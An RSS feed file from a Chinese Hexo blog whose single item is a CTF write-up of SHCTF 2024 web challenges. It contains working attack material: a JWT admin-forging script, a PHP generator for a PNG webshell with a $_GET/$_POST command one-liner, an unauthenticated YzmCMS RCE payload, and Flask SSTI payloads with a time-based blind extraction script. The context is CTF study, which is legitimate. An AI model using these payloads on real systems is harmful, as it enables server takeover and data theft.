@@ -1,0 +1,228 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;md5碰撞&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Sun, 27 Oct 2024 18:58:26 +0800</pubDate>
+        <lastBuildDate>Sun, 27 Oct 2024 18:58:26 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <category>./htaccess文件上传</category>
+        <category>php未解析</category>
+        <category>利用环境变量构造bash命令</category>
+        <category>利用.htaccess构成后门</category>
+        <category>通过php_value来设置preg_macth正则回溯次数</category>
+        <category>java反序列化</category>
+        <category>伪随机数</category>
+        <category>mysql</category>
+        <category>信息搜集（js，网络）</category>
+        <category>异或</category>
+        <category>密码爆破</category>
+        <category>sqlmap使用</category>
+        <category>SQL注入</category>
+        <category>文件包含</category>
+        <category>php伪协议</category>
+        <category>pearcmd文件包含</category>
+        <category>xpath注入</category>
+        <category>Padding oracle attack 与CBC翻转字节攻击</category>
+        <category>php</category>
+        <category>sql盲注</category>
+        <category>php7.4</category>
+        <category>FFI预处理</category>
+        <category>thinkphp3.2.4</category>
+        <category>jwt</category>
+        <category>sql二次注入</category>
+        <category>MD5碰撞</category>
+        <category>jwt密码爆破</category>
+        <category>cms</category>
+        <category>create_function()函数</category>
+        <category>sqlע��</category>
+        <category>jwt身份验证</category>
+        <category>rc4</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/</guid>
+            <title>SHctf-2024部分复现</title>
+            <link>http://odiws.github.io/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/</link>
+            <category>文件上传</category>
+            <category>MD5碰撞</category>
+            <category>jwt密码爆破</category>
+            <category>cms</category>
+            <pubDate>Sun, 27 Oct 2024 18:58:26 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;shctf2024部分复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shctf2024部分复现&#34;&gt;#&lt;/a&gt; SHctf2024 部分复现：&lt;/h2&gt;
+&lt;h3 id=&#34;week2登陆验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week2登陆验证&#34;&gt;#&lt;/a&gt; week2：登陆验证&lt;/h3&gt;
+&lt;p&gt;描述：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;他们都说jwt不安全，那我拿个密钥加密不就行了，你又不知道密钥是多少。什么? 你说可以爆破出来? 666666!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;登陆页面登录后：&lt;/p&gt;
+&lt;p&gt;发现可疑 token：&lt;a href=&#34;SHctf%B8%B4%CF%D62024.md&#34;&gt;SHctf 复现 2024.md&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjg4Mzg3MzIsImlhdCI6MTcyODgzMTUzMiwibmJmIjoxNzI4ODMxNTMyLCJyb2xlIjoidXNlciJ9.VGA6D757VurbD0RD4CS16PZOQ6jYfVowaAVT87h3NCY
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8vJUVGJUJDJTlB&#34;&gt;https://jwt.io/：&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202410271905750.png&#34; alt=&#34;image-20241027190456071&#34;&gt;&lt;/p&gt;
+&lt;p&gt;能看到 role 处是 user, 根据题目描述基本可以知道改为 admin 即可成为 &amp;quot;真正的 admin&amp;quot;&lt;/p&gt;
+&lt;p&gt;但这个 token 的加密是有密钥的，根据题目描述 &amp;quot;666666&amp;quot; 得知要爆破 6 位，优先考虑弱口令&lt;/p&gt;
+&lt;p&gt;用这个来 jwt 爆破&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xtYW1taW5vL2p3dC1jcmFja2Vy&#34;&gt;https://github.com/lmammino/jwt-cracker&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202410272015083.png&#34; alt=&#34;image-20241027201523549&#34;&gt;&lt;/p&gt;
+&lt;p&gt;基本就是这样的：获取密码，改东西上传就有 flag 了。&lt;/p&gt;
+&lt;p&gt;脚本：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; jwt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# payload&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;token_dict &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#34;exp&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1729778616&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#34;iat&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1729771416&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#34;nbf&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1729771416&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#34;role&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;admin&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;headers &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#34;alg&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;HS256&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#34;typ&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;JWT&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;jwt_token &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; jwt&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;token_dict&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# payload, 有效载体&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                       &lt;span class=&#34;token string&#34;&gt;&#34;222333&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 进行加密签名的密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                       algorithm&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;none&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 指明签名算法方式，默认也是 HS256&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                       headers&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;headers&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                       &lt;span class=&#34;token comment&#34;&gt;# json web token 数据结构包含两部分，payload (有效载体), headers (标头)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                       &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;jwt_token&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;week2拜师之旅番外&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week2拜师之旅番外&#34;&gt;#&lt;/a&gt; week2：拜师之旅・番外&lt;/h3&gt;
+&lt;p&gt;考查 PNG 文件上传二次渲染&lt;/p&gt;
+&lt;p&gt;当上传一张图片成功后，查看图片可以发现是通过 GET 传文件路径来显示的，考虑存在 include 包含&lt;/p&gt;
+&lt;p&gt;并且根据题目描述尝试下载图片回来对比会发现上传与下载的图片数据不一致，存在二次渲染&lt;/p&gt;
+&lt;p&gt;此时需要构造一张不被渲染掉的 png 图片马，这里借用了网上的脚本&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+           
+$img = imagecreatetruecolor(32, 32);
+ 
+for ($y = 0; $y &amp;lt; sizeof($p); $y += 3) &amp;#123;
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+&amp;#125;
+ 
+imagepng($img,&#39;1.png&#39;);  //要修改的图片的路径
+ 
+/* 木马内容
+&amp;lt;?$_GET[0]($_POST[1]);?&amp;gt;
+ */ 
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将构造好的图片马上传，并在查看图片页面进行命令执行&lt;/p&gt;
+&lt;p&gt;GET ：靶机地址 /？image=/upload/293146324.png &lt;code&gt;&amp;amp;0=system&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发布： &lt;code&gt;1=tac /f*&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;执行一次后再重新下载图片回来即可得到回显&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202410272029901.png&#34; alt=&#34;image-20241027202934731&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接出了&lt;/p&gt;
+&lt;h3 id=&#34;week3-小小cms&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week3-小小cms&#34;&gt;#&lt;/a&gt; [Week3] 小小 cms:&lt;/h3&gt;
+&lt;p&gt;YzmCMS 的 pay 接口调用了 db_pdo 类的 wheremethods 导致了远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。YzmCMS 的 pay 接口调用了 db_pdo 类的 wheremethods 导致了远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202410272033232.png&#34; alt=&#34;image-20241027203357867&#34;&gt;&lt;/p&gt;
+&lt;p&gt;POST:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;out_trade_no[0]=eq&amp;amp;out_trade_no[1]=cat /flag&amp;amp;out_trade_no[2]=system
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;week3love_flask&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week3love_flask&#34;&gt;#&lt;/a&gt; week3:&lt;strong&gt;love_flask&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;源码：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token decorator annotation punctuation&#34;&gt;@app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;route&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pretty_input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; render_template_string&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;html_template&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token decorator annotation punctuation&#34;&gt;@app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;route&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/namelist&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; methods&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;GET&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;name_list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;args&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    template &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;h1&gt;Hi, %s.&amp;lt;/h1&gt;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; name&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    rendered_string &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  render_template_string&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;template&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; rendered_string&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Success Write your name to database&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Error&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;name&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__main__&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;run&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8080&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;关键词：template     --------&amp;gt;   sstI&lt;/p&gt;
+&lt;p&gt;没有 return ， 但是没有任何的过滤&lt;/p&gt;
+&lt;p&gt;但是不出网，不回显，做不了一点&lt;/p&gt;
+&lt;p&gt;不回显可以反弹 shell，不出网不回显就不知道了，&lt;/p&gt;
+&lt;p&gt;wp 有两种方法：&lt;/p&gt;
+&lt;p&gt;一种是盲注，因为渲染失败会返回 500，所以可以先爆出 eval&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/namelist?name=&amp;#123;&amp;#123;().__class__.__base__.__subclasses__()[&amp;#123;&amp;#123;int(100-200)&amp;#125;&amp;#125;].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&amp;quot;time&amp;quot;).sleep(3)&#39;)&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://mmbiz.qpic.cn/mmbiz_png/crOK73kjDuiaCYofiaN8P1yvfgjTKEPdNbVKOcpjncUfkP1gtcd2VVX4YzcIfZgQHibDsYByCicmu87UF6cQAYGNvA/640?wx_fmt=png&amp;amp;from=appmsg&amp;amp;tp=webp&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着通过构造延时来爆 flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+import time
+flag =&#39;SHCTF&amp;#123;&#39;
+table = &#39;-ABCDEFabcdef0123456789&#39;
+url = &#39;http://210.44.150.15:25528/namelist?name=&#39;
+for len in range(7,43):
+    for i in table:
+      ii = flag +i
+      start_time = time.time()
+      data = &amp;quot;&amp;#123;&amp;#123;&#34;+&#34;().__class__.__base__.__subclasses__()[100].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(\&#34;os\&#34;).popen(\&#34;if [ $(head -c &amp;#123;&amp;#125; /flag) = &amp;#123;&amp;#125; ]; then sleep 2; fi\&#34;).read()&#39;)&#34;.format(len,ii) +&#34;&amp;#125;&amp;#125;&amp;quot;
+      #print(data)
+      url1 = url + data
+      r = requests.get(url1)
+      end_time = time.time()
+      response_time = end_time - start_time
+      if response_time &amp;gt;= 2:
+          flag = flag +i
+          print(flag)
+      else:
+          continue
+print(flag+&#39;&amp;#125;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;第二种&lt;/p&gt;
+&lt;p&gt;内存马&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTA5MzM/dGltZV9fMTMxMT1DcWp4UlFpUXFRcXFseEdnNlFHQ0RjbVFEODByZERDYkFlRA==&#34;&gt;https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD&lt;/span&gt;&lt;/p&gt;
